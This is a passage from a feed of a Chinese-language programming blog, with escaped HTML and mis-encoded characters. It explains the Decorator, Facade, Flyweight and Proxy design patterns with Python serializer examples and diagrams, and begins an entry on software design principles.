&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Serializer&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">s&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bs&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_encrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å®¢æˆ·ä¾§ä½¿ç”¨èµ·æ¥ä¹Ÿéå¸¸ç®€å•ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FileBackendSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/path/to/file&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¢åŠ  gzip åŠŸèƒ½&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GzipSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¢åŠ åŠ å¯†åŠŸèƒ½&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">SecureSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸Šè¿°çš„ç»„åˆå¯ä»¥çµæ´»æ­é…ï¼Œä¾‹å¦‚ï¼Œä½ å¯ä»¥ä¸ºæŸäº›æ•°æ®å¢åŠ  gzip åŠŸèƒ½ï¼ŒæŸäº›æ•°æ®å¢åŠ å®‰å…¨åŠŸèƒ½ï¼Œå¦ä¸€äº›æ•°æ®åŒæ—¶å¢åŠ  gzip å’Œå®‰å…¨åŠŸèƒ½ã€‚&lt;/p>
&lt;p>å¦å¤–ï¼Œé…åˆ &lt;code>ServerBackendSerializer&lt;/code> ä½¿ç”¨ä¹Ÿå®Œå…¨æ²¡æœ‰é—®é¢˜ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ServerBackendSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;example.com&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¢åŠ  gzip åŠŸèƒ½&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GzipSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¢åŠ åŠ å¯†åŠŸèƒ½&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">SecureSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¦‚æœæœ‰å…¶ä»–çš„æ–°å¢è¯‰æ±‚ï¼Œä¾‹å¦‚å¯¹æ•°æ®åšè¿‡æ»¤ï¼Œä¹Ÿåªéœ€æŒ‰ç…§ç±»ä¼¼çš„æ–¹å¼ï¼Œå¢åŠ ä¸€ä¸ª
&lt;code>FilterSerializer&lt;/code> å³å¯ã€‚è¿™é‡Œçš„å…³é”®ç‚¹æ˜¯ï¼Œåœ¨ä¿æŒæ¥å£ä¸€è‡´çš„å‰æä¸‹ï¼Œé€šè¿‡ç»„åˆçš„æ–¹å¼åœ¨åŸæœ‰çš„å¯¹è±¡ä¸ŠåŒ…è£…ï¼ˆè£…é¥°ï¼‰ä¸Šä¸€å±‚æ–°çš„åŠŸèƒ½ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬çœ‹ä¸€ä¸‹é‡‡ç”¨è£…é¥°å™¨æ¨¡å¼åçš„ç±»å›¾ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/decorator-class5.png">
&lt;/figure>
&lt;p>æ˜¯ä¸æ˜¯å¹²å‡€æ¸…çˆ½äº†å¾ˆå¤šï¼Ÿ&lt;/p>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#%E9%80%82%E9%85%8D%E5%99%A8--adapter">é€‚é…å™¨ (Adapter)&lt;/a>: Decorator ä¸åŒäº Adapter, å› ä¸º Decorator ä¸æ”¹å˜å¯¹è±¡çš„æ¥å£ï¼Œè€Œä»…æ·»åŠ ï¼ˆæˆ–æ”¹å˜ï¼‰å¯¹è±¡çš„åŠŸèƒ½ã€‚&lt;/li>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#%E7%BB%84%E5%90%88--composite">ç»„åˆ (Composite)&lt;/a>: å¯ä»¥å°† Decorator çœ‹æˆæ˜¯ä¸€ä¸ªé€€åŒ–çš„ã€ä»…æœ‰ä¸€ä¸ªç»„ä»¶çš„ Compositeã€‚ç„¶è€Œè¿™ä¸¤è€…çš„ç›®çš„ä¸åŒï¼ŒDecorator çš„ç›®çš„æ˜¯ä¸ºå¯¹è±¡æ·»åŠ é¢å¤–çš„åŠŸèƒ½ï¼Œè€Œéå»ºç«‹ä¸€ä¸ªå…·æœ‰å±‚æ¬¡ç»“æ„çš„å¯¹è±¡èšåˆã€‚&lt;/li>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#ç­–ç•¥--strategy">ç­–ç•¥ (Strategy)&lt;/a>: ç”¨ä¸€ä¸ªè£…é¥°å¯ä»¥ä¸ºå¯¹è±¡æ·»åŠ é¢å¤–çš„åŠŸèƒ½ï¼Œè€Œ Strategy å¯ä»¥è®©ä½ åŠ¨æ€æ›¿æ¢æŸç§åŠŸèƒ½ã€‚è¿™æ˜¯æ”¹å˜å¯¹è±¡çš„ä¸¤ç§é€”å¾„ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="å¤–è§‚--facade">å¤–è§‚ (Facade)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>ä¸ºå­ç³»ç»Ÿä¸­çš„ä¸€ç»„æ¥å£æä¾›ä¸€ä¸ªä¸€è‡´çš„ç•Œé¢ï¼ŒFacade æ¨¡å¼å®šä¹‰äº†ä¸€ä¸ªé«˜å±‚æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä½¿å¾—è¿™ä¸€å­ç³»ç»Ÿæ›´åŠ å®¹æ˜“ä½¿ç”¨ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>ä¸‹é¢è¿™ä¸ªç¤ºæ„å›¾ï¼Œå¯ä»¥æ¯”è¾ƒå½¢è±¡çš„è¡¨è¾¾ Facade æ¨¡å¼çš„æ„å›¾ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/2023-07-07_17-23-28_screenshot.png">
&lt;/figure>
&lt;h3 id="é€‚ç”¨æ€§">é€‚ç”¨æ€§&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>å½“ä½ è¦ä¸ºä¸€ä¸ªå¤æ‚å­ç³»ç»Ÿæä¾›ä¸€ä¸ªç®€å•æ¥å£æ—¶ã€‚&lt;/p>
&lt;p>å­ç³»ç»Ÿå¾€å¾€å› ä¸ºä¸æ–­æ¼”åŒ–è€Œå˜å¾—è¶Šæ¥è¶Šå¤æ‚ï¼Œåœ¨ä½¿ç”¨å¤§å¤šæ•°æ¨¡å¼æ—¶ï¼Œéƒ½ä¼šäº§ç”Ÿæ›´å¤šæ›´å°çš„ç±»ã€‚è¿™ä½¿å¾—å­ç³»ç»Ÿæ›´å…·å¯å¤ç”¨æ€§ï¼Œä¹Ÿæ›´å®¹æ˜“å¯¹å­ç³»ç»Ÿè¿›è¡Œå®šåˆ¶ï¼Œä½†ä¹Ÿç»™é‚£äº›ä¸éœ€è¦å®šåˆ¶å­ç³»ç»Ÿçš„ç”¨æˆ·å¸¦æ¥ä¸€äº›ä½¿ç”¨ä¸Šçš„å›°éš¾ã€‚â€‹&lt;strong>Facade å¯ä»¥æä¾›ä¸€ä¸ªç®€å•çš„ç¼ºçœè§†å›¾&lt;/strong>, è¿™ä¸€è§†å›¾å¯¹å¤§å¤šæ•°ç”¨æˆ·æ¥è¯´å·²ç»è¶³å¤Ÿï¼Œè€Œé‚£äº›éœ€è¦æ›´å¤šçš„å¯å®šåˆ¶æ€§çš„ç”¨æˆ·å¯ä»¥è¶Šè¿‡ Facade å±‚ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å½“ä½ éœ€è¦æ„å»ºä¸€ä¸ªå±‚æ¬¡ç»“æ„çš„å­ç³»ç»Ÿæ—¶ï¼Œâ€‹&lt;strong>ä½¿ç”¨ Facade æ¨¡å¼å®šä¹‰å­ç³»ç»Ÿä¸­æ¯å±‚çš„å…¥å£ç‚¹&lt;/strong>â€‹ã€‚å¦‚æœå­ç³»ç»Ÿä¹‹é—´æ˜¯ç›¸äº’ä¾èµ–çš„ï¼Œå¯ä»¥è®©å®ƒä»¬ä»…é€šè¿‡ Facade è¿›è¡Œé€šä¿¡ï¼Œä»è€Œç®€åŒ–å®ƒä»¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-creational/#æŠ½è±¡å·¥å‚--abstract-factory">æŠ½è±¡å·¥å‚ (Abstract Factory)&lt;/a> æ¨¡å¼å¯ä»¥ Facade æ¨¡å¼ä¸€èµ·ä½¿ç”¨ä»¥æä¾›ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£å¯ä»¥éšè—å­ç³»ç»Ÿå¯¹è±¡çš„åˆ›å»ºç»†èŠ‚ã€‚&lt;/li>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#ä¸­ä»‹è€…--mediator">ä¸­ä»‹è€… (Mediator)&lt;/a> æ¨¡å¼ä¸ Facade æ¨¡å¼æœ‰äº›ç›¸ä¼¼ä¹‹å¤„ï¼Œå®ƒä¹ŸæŠ½è±¡äº†ä¸€äº›å·²æœ‰ç±»çš„åŠŸèƒ½ã€‚ä½†æ˜¯å®ƒä»¬çš„ç›®çš„ä¸åŒï¼ŒMediator ä¸»è¦æ˜¯æŠ½è±¡å¯¹ç­‰å¯¹è±¡ä¹‹é—´çš„é€šä¿¡ï¼Œè¿™äº›å¯¹è±¡çŸ¥é“
Mediator çš„å­˜åœ¨ã€‚è€Œå­ç³»ç»Ÿå¹¶ä¸çŸ¥é“ Facade çš„å­˜åœ¨ã€‚&lt;/li>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-creational/#å•ä¾‹--singleton">å•ä¾‹ (Singleton)&lt;/a> ã€‚é€šå¸¸ä»…éœ€è¦ä¸€ä¸ª Facade å¯¹è±¡ï¼Œè¿™ç§æ—¶å€™å¯ä»¥è€ƒè™‘ä½¿ç”¨å•ä¾‹ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="äº«å…ƒ--flyweight">äº«å…ƒ (Flyweight)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>è¿ç”¨å…±äº«æŠ€æœ¯æœ‰æ•ˆåœ°æ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="é€‚ç”¨æ€§">é€‚ç”¨æ€§&lt;/h3>
&lt;p>å½“ä»¥ä¸‹æƒ…å†µéƒ½æˆç«‹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ Flyweight æ¨¡å¼ï¼š&lt;/p>
&lt;ul>
&lt;li>ä¸€ä¸ªåº”ç”¨ç¨‹åºä½¿ç”¨äº†å¤§é‡çš„å¯¹è±¡ã€‚&lt;/li>
&lt;li>å®Œå…¨ç”±äºä½¿ç”¨å¤§é‡çš„å¯¹è±¡é€ æˆå¾ˆå¤§çš„å†…å­˜å¼€é”€ã€‚&lt;/li>
&lt;li>å¯¹è±¡çš„å¤§å¤šæ•°çŠ¶æ€éƒ½å¯ä»¥å˜ä¸ºå¤–éƒ¨çŠ¶æ€ã€‚&lt;/li>
&lt;li>å¦‚æœåˆ é™¤å¯¹è±¡çš„å¤–éƒ¨çŠ¶æ€ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ç›¸å¯¹è¾ƒå°‘çš„å…±äº«å¯¹è±¡å–ä»£å¾ˆå¤šç»„å¯¹è±¡ã€‚&lt;/li>
&lt;li>åº”ç”¨ç¨‹åºä¸ä¾èµ–äºå¯¹è±¡æ ‡è¯†ã€‚ç”±äº Flyweight å¯¹è±¡å¯ä»¥è¢«å…±äº«ï¼Œæ‰€ä»¥ä¸¤ä¸ªé€»è¾‘ä¸Šä¸åŒçš„å¯¹è±¡ï¼Œå…¶ç‰©ç†ä¸Šå¯èƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤åº”ç”¨ç¨‹åºä¸åº”è¯¥ä¾èµ–å¯¹è±¡æ ‡è¯†çš„æ¯”è¾ƒã€‚&lt;/li>
&lt;/ul>
&lt;h3 id="ç»“æ„">ç»“æ„&lt;/h3>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/flyweight-class.png">
&lt;/figure>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;p>åœ¨å®ç° &lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#çŠ¶æ€--state">State çŠ¶æ€&lt;/a> æ¨¡å¼å’Œ &lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#ç­–ç•¥--strategy">Strategy ç­–ç•¥&lt;/a> æ¨¡å¼æ—¶ï¼Œå¦‚æœæ¶‰åŠçŠ¶æ€æˆ–ç­–ç•¥è¾ƒå¤šçš„ï¼Œå¯ä»¥è€ƒè™‘é‡‡ç”¨ Flyweight æ¨¡å¼æ¥å®ç°ã€‚&lt;/p>
&lt;h2 id="ä»£ç†--proxy">ä»£ç† (Proxy)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>ä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="ä¸åŒç±»å‹çš„ä»£ç†">ä¸åŒç±»å‹çš„ä»£ç†&lt;/h3>
&lt;h4 id="è¿œç¨‹ä»£ç†-remote-proxy">è¿œç¨‹ä»£ç†ï¼ˆRemote Proxyï¼‰&lt;/h4>
&lt;p>ä¸ºä¸€ä¸ªå¯¹è±¡åœ¨ä¸åŒçš„åœ°å€ç©ºé—´æä¾›å±€éƒ¨ä»£è¡¨ã€‚Android çš„ &lt;code>AIDL&lt;/code> ç”Ÿæˆçš„ &lt;code>Stub.Proxy&lt;/code> ç±»å°±æ˜¯è¿™æ ·ä¸€ç§ä»£ç†ã€‚&lt;/p>
&lt;h4 id="è™šä»£ç†-virtual-proxy">è™šä»£ç†ï¼ˆVirtual Proxyï¼‰&lt;/h4>
&lt;p>æŒ‰éœ€åˆ›å»ºå¼€é”€è¾ƒå¤§çš„å¯¹è±¡ã€‚&lt;/p>
&lt;!--list-separator-->
&lt;ul>
&lt;li>
&lt;p>&lt;em>Copy-on-write&lt;/em> (COW) ä¼˜åŒ–&lt;/p>
&lt;p>è¿™é‡Œæ‹“å±•ä¸€ä¸‹ï¼Œè¿˜å¯ä»¥å®ç°é€æ˜çš„ &lt;em>copy-on-write&lt;/em> ä¼˜åŒ–ã€‚æ‹·è´ä¸€ä¸ªåºå¤§è€Œå¤æ‚çš„å¯¹è±¡æ˜¯ä¸€ç§å¼€é”€å¾ˆå¤§çš„æ“ä½œï¼Œå¦‚æœè¿™ä¸ªæ‹·è´æ ¹æœ¬æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆè¿™äº›å¼€é”€å°±æ²¡æœ‰å¿…è¦ã€‚ç”¨ä»£ç†å»¶è¿Ÿè¿™ä¸€æ‹·è´è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¿è¯åªæœ‰å½“è¿™ä¸ªå¯¹è±¡è¢«ä¿®æ”¹çš„æ—¶å€™æ‰å¯¹å®ƒè¿›è¡Œæ‹·è´ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h4 id="ä¿æŠ¤ä»£ç†-protection-proxy">ä¿æŠ¤ä»£ç†ï¼ˆProtection Proxyï¼‰&lt;/h4>
&lt;p>æ§åˆ¶å¯¹åŸå§‹å¯¹è±¡çš„è®¿é—®ã€‚ä¿æŠ¤ä»£ç†ç”¨äºå¯¹è±¡åº”è¯¥æœ‰ä¸åŒçš„è®¿é—®æƒé™çš„æ—¶å€™ã€‚&lt;/p>
&lt;h4 id="æ™ºèƒ½å¼•ç”¨-smart-reference">æ™ºèƒ½å¼•ç”¨ï¼ˆSmart Referenceï¼‰&lt;/h4>
&lt;p>å–ä»£ç®€å•çš„æŒ‡é’ˆï¼Œå®ƒåœ¨è®¿é—®å¯¹è±¡æ—¶æ‰§è¡Œä¸€äº›é™„åŠ æ“ä½œï¼Œå…¸å‹ç”¨é€”åŒ…æ‹¬ï¼š&lt;/p>
&lt;ul>
&lt;li>å¯¹æŒ‡å‘å®é™…å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼Œè¿™æ ·å½“è¯¥å¯¹è±¡æ²¡æœ‰å¼•ç”¨æ—¶ï¼Œå¯ä»¥è‡ªåŠ¨é‡Šæ”¾å®ƒï¼ˆä¹Ÿç§°ä¸º Smart Pointerï¼‰ã€‚&lt;/li>
&lt;li>å½“ç¬¬ä¸€æ¬¡å¼•ç”¨ä¸€ä¸ªæŒä¹…å¯¹è±¡æ—¶ï¼Œå°†å®ƒè£…å…¥å†…å­˜ã€‚&lt;/li>
&lt;li>åœ¨è®¿é—®ä¸€ä¸ªå®é™…å¯¹è±¡å‰ï¼Œæ£€æŸ¥æ˜¯å¦å·²ç»é”å®šäº†å®ƒï¼Œä»¥ç¡®ä¿å…¶ä»–å¯¹è±¡ä¸èƒ½æ”¹å˜å®ƒã€‚&lt;/li>
&lt;/ul>
&lt;h3 id="ç»“æ„">ç»“æ„&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">Proxy
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +--------+ +---------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | Client +-----------------&amp;gt;+ Subject |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +--------+ +---------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | request |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | ... |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> á
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---------------------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +-------+-----+ realSubject +----+----+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | RealSubject +&amp;lt;---------------+ Proxy | +------------------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +-------------+ +---------+ | ... |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | request | | request +------+ realSubject.request() |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | ... | | ... | | ... |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +-------------+ +---------+ +------------------------+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#%E9%80%82%E9%85%8D%E5%99%A8--adapter">Adapter é€‚é…å™¨&lt;/a>: é€‚é…å™¨ä¸ºå®ƒæ‰€é€‚é…çš„å¯¹è±¡æä¾›ä¸€ä¸ªä¸åŒçš„æ¥å£ã€‚ç›¸åï¼Œä»£ç†æä¾›ä¸å®ƒçš„å®ä½“ç›¸åŒçš„æ¥å£ã€‚&lt;/li>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#%E8%A3%85%E9%A5%B0%E5%99%A8--decorator">Decorator è£…é¥°å™¨&lt;/a>: è£…é¥°çš„å®ç°éƒ¨åˆ†å’Œä»£ç†æœ‰ç‚¹ç±»ä¼¼ï¼Œä½†æ˜¯ç›®çš„ä¸åŒã€‚è£…é¥°ä¸ºå¯¹è±¡æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªåŠŸèƒ½ï¼Œè€Œä»£ç†åˆ™æ§åˆ¶å¯¹å¯¹è±¡çš„è®¿é—®ã€‚å¦å¤–å®ç°ä¸Šè™½ç„¶æœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œä½†è¿˜æ˜¯æœ‰äº›ç»†å¾®çš„å·®å¼‚ã€‚ä¾‹å¦‚ï¼ŒRemote Proxy å¹¶ä¸åŒ…å«å¯¹å®ä½“çš„ç›´æ¥å¼•ç”¨ï¼Œè€Œåªæ˜¯ä¸€ä¸ªé—´æ¥å¼•ç”¨ï¼ˆä¾‹å¦‚ Android &lt;code>AIDL&lt;/code> çš„ä¾‹å­ï¼‰ã€‚&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/design-pattern/" term="Design-Pattern" label="Design-Pattern"/><category scheme="https://mincodes.com/tags/architecture/" term="Architecture" label="Architecture"/></entry><entry><title type="text">è½¯ä»¶è®¾è®¡åŸåˆ™ã€è®¾è®¡æ¨¡å¼æ€»ç»“</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/design-patterns/"/><id>https://mincodes.com/posts/design-patterns/</id><updated>2023-07-24T21:16:07+08:00</updated><published>2023-07-03T16:40:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">å‰è¨€ æœ¬æ–‡æ˜¯ç¬”è€…å¯¹è½¯ä»¶è®¾è®¡åŸåˆ™ã€è®¾è®¡æ¨¡å¼çš„ä¸€ä¸ªæ¢³ç†ï¼Œå¾ˆå¤šå†…å®¹å‚è€ƒè‡ªã€Šè®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€â€¦</summary><content type="html">&lt;!-- weight = 200 -->
&lt;h2 id="å‰è¨€">å‰è¨€&lt;/h2>
&lt;p>æœ¬æ–‡æ˜¯ç¬”è€…å¯¹è½¯ä»¶è®¾è®¡åŸåˆ™ã€è®¾è®¡æ¨¡å¼çš„ä¸€ä¸ªæ¢³ç†ï¼Œå¾ˆå¤šå†…å®¹å‚è€ƒè‡ªã€Šè®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ã€‹ä¸€ä¹¦ï¼ˆå°¤å…¶æ˜¯&lt;a href="https://mincodes.com/posts/design-patterns/#%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F">è®¾è®¡æ¨¡å¼&lt;/a>éƒ¨åˆ†ï¼‰ã€‚å…¶ä¸­ä¹ŸåŒ…å«äº†ç¬”è€…ä¸ªäººçš„ä¸€äº›æ€è€ƒå’Œæ€»ç»“ã€‚&lt;/p>
&lt;h2 id="æ¦‚å¿µå’Œæœ¯è¯­">æ¦‚å¿µå’Œæœ¯è¯­&lt;/h2>
&lt;p>æœ¬ç« æ•´ç†äº†ä¸€äº›å®¹æ˜“æ··æ·†çš„æ¦‚å¿µå’Œæœ¯è¯­ã€‚&lt;/p>
&lt;h3 id="å¯¹è±¡é—´å…³ç³»">å¯¹è±¡é—´å…³ç³»&lt;/h3>
&lt;p>å…ˆç”¨ä¸€å¼  UML å›¾æ¥ç›´è§‚å±•ç¤ºä¸€ä¸‹ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/object-relationships.png">
&lt;/figure>
&lt;p>ç®€å•è§£é‡Šä¸€ä¸‹ï¼š&lt;/p>
&lt;dl>
&lt;dt>Inheritance&lt;/dt>
&lt;dd>ç»§æ‰¿ï¼Œè¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯çˆ¶ç±»å’Œå­ç±»çš„å…³ç³»ã€‚&lt;/dd>
&lt;dt>Composition&lt;/dt>
